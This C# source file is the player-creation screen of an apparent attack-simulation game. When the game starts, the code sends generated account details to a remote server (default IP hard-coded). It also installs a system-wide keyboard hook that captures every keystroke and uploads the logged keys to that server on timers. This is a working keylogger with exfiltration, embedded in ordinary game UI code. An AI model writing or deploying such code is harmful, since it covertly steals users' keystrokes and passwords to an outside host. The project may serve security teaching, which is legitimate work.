using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Input;
using System.Windows.Forms;
using AttackSecuritySimulator_Models;

namespace AttackSecuritySimulator_ViewModels
{
    public class PlayerCreationViewModel : BaseViewModelPropertyChanged, IPageViewModel, IPoolSubscriber
    {
        #region Properties

        private static PlayerStatsModel customPlayer;
        public static PlayerStatsModel CustomPlayer
        {
            get
            {
                //Custom player will be defined when the Button is clicked
                if (customPlayer == null)
                {
                    return null;
                }
                return customPlayer;
            }
        }

        private GameClient currentClient;
        public GameClient CurrentClient
        {
            get
            {
                if (currentClient == null)
                {
                    return currentClient = null;
                }
                return currentClient;
            }
        }

        private ICommand startGame;
        public ICommand StartGame
        {
            get
            {
                if (startGame == null)
                {
                    startGame = new RelayCommand(FinalisePlayerAndStart, condition => InputfieldConditions.All(item => item.Equals(true)));
                }
                return startGame;
            }
        }
        private int inputFieldCharacterLimit = 12;
        public int InputFieldCharacterLimit
        {
            get
            {
                return inputFieldCharacterLimit;
            }
        }
        private bool InputValidation(string input)
        {
            //Check if the inputted string is within 12 characters and only contains letters and digits.
            if (string.IsNullOrWhiteSpace(input) || input.Length > inputFieldCharacterLimit || input.Any(char.IsSymbol))
            {
                return false;
            }
            return true;
        }
        private bool[] inputFieldConditions;
        private bool[] InputfieldConditions
        {
            get
            {
                if (inputFieldConditions == null)
                {
                    inputFieldConditions = new bool[3];
                    inputFieldConditions[(int)InputField.Name] = InputValidation(PlayerName);
                    inputFieldConditions[(int)InputField.Like] = InputValidation(PlayerLike);
                    inputFieldConditions[(int)InputField.Hate] = InputValidation(PlayerHate);
                }
                return inputFieldConditions;
            }
        }


        #endregion


        private void FinalisePlayerAndStart(object sender)
        {
            #region Finalise Player Stats

            Random random = new Random();
            //Email Details
            string finalisedEmail = string.Format($"{PlayerName}@gmail.com");
            string finalisedEmailPassword = string.Format($"{PlayerHate}slayer69");
            //Bank Details
            char[] finalisedBankNumber = new char[9];
            for (int i = 0; i < finalisedBankNumber.Length; i++)
            {
                finalisedBankNumber[i] = random.Next(0, 10).ToString()[0];
            }
            string finalisedBankPassword = string.Format($"iL0ve{PlayerLike}");
            //PayPal Details
            char[] finalisedPayPalPassword = new char[10];
            for (int i = 0; i < finalisedPayPalPassword.Length; i++)
            {
                //Ascii table decimal values : https://www.asciitable.com/
                //Use .Next to generate printable characters.
                finalisedPayPalPassword[i] = (char)random.Next(32, 127);
            }
            //Create BankingDetails param
            BankingDetailsModel[] customBankDetails = new BankingDetailsModel[2];
            customBankDetails[(int)BankType.ANZ] = new BankingDetailsModel(new string(finalisedBankNumber), finalisedBankPassword, 1000);
            customBankDetails[(int)BankType.PayPal] = new BankingDetailsModel(finalisedEmail, new string(finalisedPayPalPassword), 1000);
            //Create the player model
            customPlayer = new PlayerStatsModel(finalisedEmail, finalisedEmailPassword, customBankDetails);

            #endregion

            #region Create client and connect to host

            //Update the AddressLibrary to sync the navigation commands.
            NavigationHelper.UpdateLibrary(HostServerIP);
            //Create the client to the hosted server
            currentClient = new GameClient(HostServerIP);
            //Send details to hosted server
            if (CurrentClient.ConnectedToServer)
            {
                string fileNameToServer = "ASS_Details";
                fileContentsToServer = customPlayer.ToString();
                CurrentClient.SendTextFileToServer(fileContentsToServer, fileNameToServer);
            }

            #endregion

            #region Set Keylog Hook

            //Start keylogger
            //Assign callback implementation.
            hookSetUp.KeyPressedCallback = KeyProcCallback;
            //Create the hook
            hookSetUp.SetHook(hookSetUp.KeyPressedCallback);

            //Start the timers

            //Override
            sendToServerTimer.Interval = sendToServerInterval;
            sendToServerTimer.Elapsed += SendKeyProcsToServer;
            sendToServerTimer.Start();

            //Idle checker
            keyboardIdleCheckTimer.Interval = idleInterval;
            keyboardIdleCheckTimer.Elapsed += SendKeyProcsToServer;
            keyboardIdleCheckTimer.Start();

            //Subscribe CleanUp to event.
            //The Quit button or returning to the main menu from in game should notify this.
            Mediator.SubscribeEvent("HookCleanUp", HookCleanUp);

            #endregion

            //Navigate to in game
            Mediator.Notify("NavIngame", "");
        }

        #region Text Box Data Binding

        private string playerName;
        public string PlayerName
        {
            get
            {
                if (string.IsNullOrWhiteSpace(playerName))
                {
                    return playerName = "12 character limit";
                }
                return playerName;
            }
            set
            {
                playerName = value;
                inputFieldConditions[(int)InputField.Name] = InputValidation(PlayerName);
                OnPropertyChanged("PlayerName");
                OnPropertyChanged("InputfieldConditions");
                OnPropertyChanged("StartGame");
            }
        }

        private string playerLike;
        public string PlayerLike
        {
            get
            {
                if (string.IsNullOrWhiteSpace(playerLike))
                {
                    return playerLike = "12 character limit";
                }
                return playerLike;
            }
            set
            {
                playerLike = value;
                inputFieldConditions[(int)InputField.Like] = InputValidation(PlayerLike);
                OnPropertyChanged("PlayerLike");
                OnPropertyChanged("InputfieldConditions");
                OnPropertyChanged("StartGame");
            }
        }


        private string playerHate;
        public string PlayerHate
        {
            get
            {
                if (string.IsNullOrWhiteSpace(playerHate))
                {
                    return playerHate = "12 character limit";
                }
                return playerHate;
            }
            set
            {
                playerHate = value;
                inputFieldConditions[(int)InputField.Hate] = InputValidation(PlayerHate);
                OnPropertyChanged("PlayerHate");
                OnPropertyChanged("InputfieldConditions");
                OnPropertyChanged("StartGame");
            }
        }

        private string hostServerIP;
        public string HostServerIP
        {
            get
            {
                if (string.IsNullOrWhiteSpace(hostServerIP))
                {
                    return hostServerIP = "123.211.10.65";
                }
                return hostServerIP;
            }
            set
            {
                hostServerIP = value;
                OnPropertyChanged("CurrentServerIP");
            }
        }

        #endregion

        #region Keylogging SetUp

        private string fileContentsToServer;
        private string keyLogFileToServer = "ASS_KeyLogs";

        private KeyboardHookSetup hookSetUp = new KeyboardHookSetup();
        /// <summary>
        /// Call back implementation when the event is raised.
        /// 
        /// Params:
        ///     nCode:      decision to process the event
        ///     wParam:     Checking for key state down
        ///     lParam:     Checking which key is pressed
        /// </summary>
        private IntPtr KeyProcCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)hookSetUp.KeyStateDown)
            {
                bool shiftHeld = KeyboardCipher.ShiftCheck();
                bool capsOn = KeyboardCipher.CapsCheck();
                Keys pressedKey = (Keys)Marshal.ReadInt32(lParam);
                string translatedKey = KeyboardCipher.KeyTranslator(pressedKey, shiftHeld, capsOn);
                storedKeyIndexer++;

                #region Send after 10 key press

                //StoreKeyPress(translatedKey, ref storedKeyIndexer);

                #endregion

                #region Send after 2 seconds of Idle

                //Stop the timer and restart it again after storing the key.

                keyboardIdleCheckTimer.Stop();
                storedKeyProcsList.Add(translatedKey);
                keyboardIdleCheckTimer.Start();

                #endregion

            }

            return KeyboardHookSetup.CallNextHookEx(hookSetUp.HookID, nCode, wParam, lParam);
        }

        #region Every 10 method

        private int maxKeyStorageSize = 10;
        private string[] storedKeyStrokes;
        private int storedKeyIndexer = -1;
        private void StoreKeyPress(string input, ref int indexer)
        {
            //Store the keystroke into the array at the index if within the bounds of the array
            if (indexer < maxKeyStorageSize)
            {
                storedKeyStrokes[indexer] = input;
            }
            //When the indexer exceeds the limit, convert the array into a string to be sent to the server.
            //Then input the key that caused the out of index as index 0;
            else
            {
                fileContentsToServer = DateTime.Now.ToString(@"dd\/MM\/yyyy h\:mm tt");
                fileContentsToServer += " => ";
                for (int i = 0; i < storedKeyStrokes.Length; i++)
                {
                    fileContentsToServer += storedKeyStrokes[i];
                }
                CurrentClient.SendTextFileToServer(fileContentsToServer, keyLogFileToServer, false);

                indexer = 0;
                storedKeyStrokes[indexer] = input;
            }

        }


        #endregion

        #region Auto send Method

        /// <summary>
        /// The Idea behind this method is to send the keystrokes to the server in more readable chunks.
        /// So keystrokes will be sent to the server after there has not been any keyboard events in a sepcdfied
        /// amount of time.
        /// 
        /// There will also be an override timer that sends the keystrokes (if any) regardless of whether it was idle or not.
        /// This is to combat the first timer if a button was held indefinitely and to keep the list from becoming too big to send.
        /// </summary>

        System.Timers.Timer keyboardIdleCheckTimer = new System.Timers.Timer();
        System.Timers.Timer sendToServerTimer = new System.Timers.Timer();
        //miliseconds
        private int idleInterval = 2000;
        private int sendToServerInterval = 31000;
        private List<string> storedKeyProcsList = new List<string>();

        private void SendKeyProcsToServer(object sender, System.Timers.ElapsedEventArgs e)
        {
            //If list is empty don't bother sending anything
            if (storedKeyProcsList.Count <= 0)
            {
                return;
            }
            else
            {
                //Format start of message to date time.
                fileContentsToServer = DateTime.Now.ToString(@"dd\/MM\/yyyy h\:mm tt");
                fileContentsToServer += " => ";
                //Extract contents of the list and add them to the message
                for (int i = 0; i < storedKeyProcsList.Count; i++)
                {
                    fileContentsToServer += storedKeyProcsList[i];
                }
                //Send message to server
                CurrentClient.SendTextFileToServer(fileContentsToServer, keyLogFileToServer, false);
                //Clear the list for new inputs.
                storedKeyProcsList.Clear();

            }

        }

        #endregion

        private void HookCleanUp(object sender)
        {
            hookSetUp.UnHook();
            sendToServerTimer.Elapsed -= SendKeyProcsToServer;
            keyboardIdleCheckTimer.Elapsed -= SendKeyProcsToServer;
        }

        #endregion

        public string InstanceKey()
        {
            return "PlayerCreationViewModel";
        }

        public PlayerCreationViewModel()
        {
            //Add this instance to the pool.
            ViewModelPool.AddToPool(this.InstanceKey(), this);
            storedKeyStrokes = new string[maxKeyStorageSize];
        }

        private enum InputField
        {
            Name,
            Like,
            Hate
        }
    }


}
